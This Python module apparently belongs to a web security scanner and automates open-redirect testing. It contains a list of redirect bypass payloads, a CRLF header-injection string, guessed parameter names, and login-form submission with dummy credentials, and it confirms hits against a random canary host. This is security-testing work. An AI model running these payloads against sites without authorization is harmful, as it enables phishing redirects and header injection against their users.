from __future__ import annotations
from huntnyx.core.common import *  # noqa: F401,F403


_REDIR_CANARY = "https://www.youtube.com"


_REDIR_TEMPLATES = [
    "https://{c}", "https://{c}/", "http://{c}", "//{c}",
    "///{c}", "////{c}", "https:{c}", "https:/{c}",
    "/https://{c}", "/%09/{c}", "/%2f{c}",
    "//{c}/%2f%2e%2e", "https://{c}/%2f%2e%2e",
    "//{c}%00", "//{c}%2f..",
    "/\\{c}", "/%5c{c}", "//%5c{c}", "\\/\\/{c}/", "/\\/{c}/",
    "https://{t}@{c}", "//{t}@{c}", "https://{t}%40{c}",
    "{c}", "http:{c}",
    "%2f%2f{c}", "/%2f%2f{c}", "/%2e%2e%2f{c}",
    "//{c}%20", "//{c}%23", "//{c}%3F",
    "///{t}@//{c}", "////{t}@//{c}",
    "//[0:0:0:0:0:0:0:0]@{c}",
    "https:%2f%2f{c}", "https://%01%02%03@{c}",
    "%0d%0aLocation:%20https://{c}",
]


_REDIR_PARAM_HINTS = (
    "url", "next", "dest", "destination", "redirect", "redir", "redirect_to",
    "go", "redirect_uri", "redirect_url", "return_path", "return_to",
    "returnto", "rurl", "redirectto", "forward", "return", "returnurl",
    "return_url", "continue", "r", "u", "target", "goto", "out", "view",
    "to", "link", "checkout_url", "image_url", "callback", "hf", "ref",
    "uri", "path", "domain", "site", "host", "page", "file", "val", "window",
    "location", "href", "load", "source", "src", "origin", "back", "next_url",
    "redirect_to_url", "redirect_url_path", "success_url", "failure_url",
    "cancel_url", "return_url", "rurl", "ru", "return_to_url",
)


def _redirect_in_body(body, canary):
    if not body or canary not in body:
        return False
    b = body.lower()
    c = re.escape(canary.lower())
    if re.search(r'<meta[^>]+http-equiv=["\']?refresh["\']?[^>]+' + c, b, re.I):
        return True
    js_patterns = [
        r'(?:window\.)?location(?:\.href)?\s*=\s*["\'`][^"\'`]*' + c,
        r'(?:window\.)?location\.replace\s*\(\s*["\'`][^"\'`]*' + c,
        r'document\.location\s*=\s*["\'`][^"\'`]*' + c,
        r'self\.location\s*=\s*["\'`][^"\'`]*' + c,
        r'top\.location\s*=\s*["\'`][^"\'`]*' + c,
        r'parent\.location\s*=\s*["\'`][^"\'`]*' + c,
    ]
    return any(re.search(p, b, re.I) for p in js_patterns)


def _authority_host(protocol_relative):
    """Extract the effective navigation host from a `//authority...` string,
    stripping userinfo (`user@host`), port, and IPv6 brackets."""
    try:
        netloc = urlsplit("http:" + protocol_relative).netloc
    except Exception:
        return ""
    host = netloc.split("@")[-1]              # userinfo before '@' is NOT the host
    if host.startswith("["):                  # IPv6 literal
        host = host[1:host.index("]")] if "]" in host else host.strip("[]")
    elif ":" in host:
        host = host.rsplit(":", 1)[0]         # strip :port
    return host.strip().lower()


def _redirect_hits_canary(location, canary):
    """Host-only open-redirect confirmation.

    Returns True ONLY when the Location, resolved the way a browser would,
    navigates OFF-ORIGIN to the canary host (or a subdomain of it). Crucially:
      * a single leading slash ('/...') is a same-origin relative redirect and
        NEVER counts, even if the path/query embeds '://' or the canary string
        (this was the previous false-positive source);
      * only a scheme ('scheme://host') or a protocol-relative authority
        ('//host', collapsed from '///' etc.) can be off-origin;
      * userinfo is stripped, so 'https://canary@target' is target (not a hit)
        while 'https://target@canary' is canary (a hit).
    """
    if not location:
        return False
    loc = location.strip().replace("\\", "/")          # browsers treat \ as /
    loc = re.sub(r"[\x00-\x1f\x7f]+", "", loc)          # drop stray control bytes
    canary = (canary or "").strip("/").lower()
    if not canary:
        return False
    m = re.match(r"^([a-z][a-z0-9+.\-]*):", loc, re.I)  # explicit scheme?
    if m:
        rest = loc[m.end():]
        authority = ("//" + rest.lstrip("/")) if not rest.startswith("//") else rest
        host = _authority_host(authority)
    else:
        lead = len(loc) - len(loc.lstrip("/"))
        if lead >= 2:                                  # '//host', '///host' -> off-origin
            host = _authority_host("//" + loc.lstrip("/"))
        else:                                          # '/path' or relative = same origin
            return False
    if not host:
        return False
    return host == canary or host.endswith("." + canary)


_REDIR_INJECT_NAMES = (
    "redirect_url", "redirect", "redirect_uri", "redirect_to", "redirectto",
    "return", "returnurl", "return_url", "returnto", "return_to", "next",
    "url", "dest", "destination", "continue", "goto", "forward", "redir",
    "callback", "checkout_url", "r", "u", "to",
)


def _login_forms(target):
    """Auto-detect auth/login POST forms (a POST form with a password field)."""
    out, seen = [], set()
    crawl = target.results.get("crawl") or {}
    for fm in crawl.get("forms", []) + list(getattr(target, "extra_forms", [])):
        if (fm.get("method", "get") or "get").lower() != "post":
            continue
        names = [str(i).lower() for i in fm.get("inputs", [])]
        if any("pass" in n for n in names):
            action = fm.get("action")
            if action and action not in seen:
                seen.add(action)
                out.append(fm)
    return out


def _dummy_login_body(inputs, override):
    """Fill the login form with plausible dummy values (open redirect on many
    apps — e.g. NahamStore — fires on the POST regardless of auth success).
    `override` (config _login_data) wins if the app needs real credentials."""
    if override:
        return override
    parts = []
    for name in inputs:
        low = str(name).lower()
        if "mail" in low:
            val = "test@test.com"
        elif "pass" in low:
            val = "Test1234!"
        elif "user" in low or "name" in low:
            val = "tester"
        else:
            val = "test"
        parts.append(f"{name}={val}")
    return "&".join(parts)


_REDIR_SPEC_NAMES = ("url", "next", "redirect", "redirect_url", "redirect_uri",
                     "return", "returnurl", "return_url", "dest", "destination",
                     "continue", "goto", "r", "u", "to")


def _redirect_spec_probe(target, config, runner, result, canary):
    """Autonomy without --url: guess redirect-style parameter names on every
    discovered endpoint (crawl pages / content dirs) that wasn't already tested
    with a real parameter. Light payload set + curated names keep it bounded;
    confirm-by-proof (Location must hit the canary) keeps false positives ~0."""
    tested = {(urlsplit(pe["url"]).netloc, urlsplit(pe["url"]).path)
              for pe in _active_targets(target)}
    disc = set()
    crawl = target.results.get("crawl") or {}
    for u in crawl.get("urls", []):
        disc.add(u)
    content = target.results.get("content") or {}
    for e in content.get("services", []):
        base = e.get("url", "")
        for f in e.get("found", []):
            if (f.get("status") or 0) in (200, 301, 302, 401, 403):
                disc.add(base.rstrip("/") + "/" + (f.get("path") or "").lstrip("/"))
    for s in target.web_services:
        disc.add(s.url)
    light = [f"https://{canary}", f"//{canary}"]
    cap = int(config.get("active.max_endpoints", 60) or 60)
    n = 0
    for u in sorted(x for x in disc if x):
        sp = urlsplit(u)
        if (sp.netloc, sp.path) in tested:
            continue
        base = urlunsplit((sp.scheme, sp.netloc, sp.path, "", ""))
        n += 1
        if n > cap:
            break
        for name in _REDIR_SPEC_NAMES:
            hit = None
            for payload in light:
                url = base + "?" + urlencode({name: payload})
                st, hd, _b, _ = _curl_full(
                    url, config, runner,
                    "redir_spec_" + re.sub(r"\W+", "_", name)[:18],
                    extra=["--max-redirs", "0"])
                if _redirect_hits_canary(hd.get("location", ""), canary):
                    hit = {"payload": payload, "method": "GET",
                           "where": f"Location header (HTTP {st})",
                           "location": hd.get("location", ""), "example": url}
                    break
            if hit:
                result["findings"].append({"url": base, "param": name, **hit})
                UI.ok(f"OPEN REDIRECT (GET): {base} [{name}]")
                UI.dim(f"      -> {hit['example']}")
                UI.dim(f"      -> Location: {hit.get('location','')}")


def _redirect_login_probe(target, config, runner, result):
    """Post-login open redirect: submit each auth form with a UNIQUE random
    canary host in redirect-style params (in BOTH query and body), then confirm
    the 302 Location points to that canary. The random host makes a match
    unforgeable (a hardcoded redirect can't accidentally equal it)."""
    forms = _login_forms(target)
    if not forms:
        return
    canary = f"redir{_rand(8)}.canary-oob.test"
    override = config.get("_login_data")
    payload_tpls = ("https://{c}", "//{c}", "https://{c}/", "http://{c}")
    UI.info(f"open redirect: login-aware probe on {len(forms)} auth form(s)")
    for fm in forms:
        action = fm.get("action")
        body = _dummy_login_body(fm.get("inputs", []), override)
        sp = urlsplit(action)
        existing_q = dict(parse_qsl(sp.query, keep_blank_values=True))
        base = urlunsplit((sp.scheme, sp.netloc, sp.path, "", ""))
        names = list(dict.fromkeys(list(existing_q.keys()) + list(_REDIR_INJECT_NAMES)))
        for name in names:
            hit = None
            for tpl in payload_tpls:
                payload = tpl.format(c=canary)
                q = dict(existing_q)
                q[name] = payload
                url = base + "?" + urlencode(q)
                tag = "redir_login_" + re.sub(r"\W+", "_", name)[:24]
                gs, gh, _gb, _ = _curl_full(url, config, runner, tag + "_get",
                                            extra=["--max-redirs", "0"])
                gloc = gh.get("location", "")
                if _redirect_hits_canary(gloc, canary):
                    hit = {"payload": payload, "method": "GET",
                           "where": f"Location header (HTTP {gs})",
                           "location": gloc, "example": url}
                    break
                status, headers, _b, _res = _curl_full(
                    url, config, runner, tag,
                    extra=["--data", body + f"&{name}={payload}", "--max-redirs", "0"])
                loc = headers.get("location", "")
                if _redirect_hits_canary(loc, canary):
                    hit = {"payload": payload, "method": "POST(login)",
                           "where": f"Location after login POST (HTTP {status})",
                           "location": loc, "example": url + "  (+login body)"}
                    break
            if hit:
                result["findings"].append({"url": base, "param": name, **hit})
                UI.ok(f"OPEN REDIRECT ({hit['method']}): {base} [{name}]")
                UI.dim(f"      -> {hit.get('example', base)}")
                UI.dim(f"      -> Location: {hit.get('location','')}")


def phase_redirect(target, config, runner):
    result = {"findings": [], "errors": []}
    gets = _active_targets(target)
    forms = _post_forms(target)
    _crawl = target.results.get("crawl") or {}
    _content = target.results.get("content") or {}
    _has_disc = bool(_crawl.get("urls") or _content.get("services") or target.web_services)
    if not gets and not forms and not _has_disc:
        result["errors"].append("no parameterized endpoints or POST forms (run crawl first)")
        UI.warn("redirect: nothing to test")
        return result
    delay = float(config.get("active.delay", 0) or 0)
    max_ep = config.get("active.max_endpoints", 60)
    # Default to a RANDOM, non-existent canary host. A legitimate/hardcoded
    # redirect can never coincidentally equal it, so a Location-host match is
    # unforgeable proof. An explicit config canary (e.g. a real OAST host you
    # control) still wins if set.
    raw_canary = (config.get("redirect.canary") or "").strip()
    if raw_canary:
        canary = re.sub(r"^[a-zA-Z][\w+.\-]*://", "", raw_canary).strip("/").lower()
    else:
        canary = f"redir{_rand(10)}.canary-oob.test"
    tested_params = 0
    UI.info("open redirect scan")
    UI.dim(f"      testing {len(gets)} GET endpoints, {len(forms)} POST forms")

    def probe(loc_url, method, all_params, param, sender):
        thost = urlsplit(loc_url).netloc.split(":")[0]
        priority = [
            f"https://{canary}",
            f"//{canary}",
            f"https://{thost}@{canary}",
            f"//{thost}@{canary}",
        ]
        remaining = [
            tpl.format(c=canary, t=thost)
            for tpl in _REDIR_TEMPLATES
            if tpl.format(c=canary, t=thost) not in priority
        ]
        all_payloads = priority + remaining
        for payload in all_payloads:
            if method == "GET":
                data = {p: "1" for p in all_params}
                data[param] = payload
                full_url = _build_url(loc_url, data)
                status, headers, body, res = _curl_full(
                    full_url, config, runner, f"redir_{hash(payload) % 10000:04d}",
                    extra=["--max-redirs", "0"]
                )
            else:
                data = {p: "1" for p in all_params}
                data[param] = payload
                status, headers, body, res = _curl_full(
                    loc_url, config, runner, f"redirp_{hash(payload) % 10000:04d}",
                    extra=["--data", urlencode(data), "--max-redirs", "0"]
                )
            example = full_url if method == "GET" else (loc_url + f"  (POST body {param}=…)")
            loc = headers.get("location", "")
            if _redirect_hits_canary(loc, canary):
                return {
                    "payload": payload,
                    "where": f"Location header (HTTP {status})",
                    "location": loc,
                    "example": example,
                }
            if body and _redirect_in_body(body, canary):
                return {
                    "payload": payload,
                    "where": f"meta/JS in body (HTTP {status})",
                    "location": "(client-side)",
                    "example": example,
                    "review": True,   # reflection into a sink, not a verified 3xx
                }
            if delay:
                time.sleep(delay)
        return None

    for pe in gets[:max_ep]:
        for param in sorted(pe["params"],
                          key=lambda p: (p.lower() not in _REDIR_PARAM_HINTS, p)):
            tested_params += 1
            tag = "redir_" + re.sub(r"\W+", "_", pe["url"] + param)[:34]
            hit = probe(pe["url"], "GET", pe["params"], param,
                       lambda d, u=pe["url"]: _curl_full(
                           _build_url(u, d), config, runner, tag,
                           extra=["--max-redirs", "0"]
                       )[1:3])
            if hit:
                result["findings"].append({
                    "url": pe["url"],
                    "param": param,
                    "method": "GET",
                    **hit
                })
                UI.ok(f"OPEN REDIRECT: GET {pe['url']} [{param}]")
                UI.dim(f"      -> {hit.get('example', pe['url'])}")
                UI.dim(f"      -> Location: {hit.get('location','')}")

    for fm in forms[:max_ep]:
        for field in sorted(fm["inputs"],
                          key=lambda p: (p.lower() not in _REDIR_PARAM_HINTS, p)):
            tested_params += 1
            tag = "redirp_" + re.sub(r"\W+", "_", fm["action"] + field)[:34]
            hit = probe(fm["action"], "POST", fm["inputs"], field,
                       lambda d, a=fm["action"]: _curl_full(
                           a, config, runner, tag,
                           extra=["--data", urlencode(d), "--max-redirs", "0"]
                       )[1:3])
            if hit:
                result["findings"].append({
                    "url": fm["action"],
                    "param": field,
                    "method": "POST",
                    **hit
                })
                UI.ok(f"OPEN REDIRECT: POST {fm['action']} [{field}]")
                UI.dim(f"      -> {hit.get('example', fm['action'])}")
                UI.dim(f"      -> Location: {hit.get('location','')}")

    _redirect_spec_probe(target, config, runner, result, canary)
    _redirect_login_probe(target, config, runner, result)

    best = {}
    for f in result["findings"]:
        k = (f.get("url"), f.get("param"))
        cur = best.get(k)
        if cur is None or (str(f.get("method", "")).startswith("GET")
                           and not str(cur.get("method", "")).startswith("GET")):
            best[k] = f
    result["findings"] = list(best.values())

    confirmed = [f for f in result["findings"] if not f.get("review")]
    review = [f for f in result["findings"] if f.get("review")]
    if confirmed:
        UI.ok(f"found {len(confirmed)} confirmed open redirect(s)")
    if review:
        UI.warn(f"{len(review)} client-side reflection(s) — needs manual verification")
    if not confirmed and not review:
        UI.dim(f"      no open redirects found ({tested_params} parameters tested)")
    return result


def _r_redirect(d):
    lines = _sec("OPEN REDIRECT")
    fs = d.get("findings", [])
    if not fs:
        note = d.get("errors", [])
        lines.append("  " + ("none found" if not note else note[0]))
        return lines + [""]
    for f in fs:
        tag = "  [review: client-side reflection]" if f.get("review") else "  [CONFIRMED]"
        lines.append(f"  {f.get('method','GET')} {f['url']}  [{f['param']}]{tag}")
        if f.get("example"):
            lines.append(f"      URL     : {f['example']}")
        lines.append(f"      payload : {f['payload']}")
        lines.append(f"      via     : {f.get('where','Location header')}")
        lines.append(f"      Location: {f.get('location','')}")
    return lines + [""]
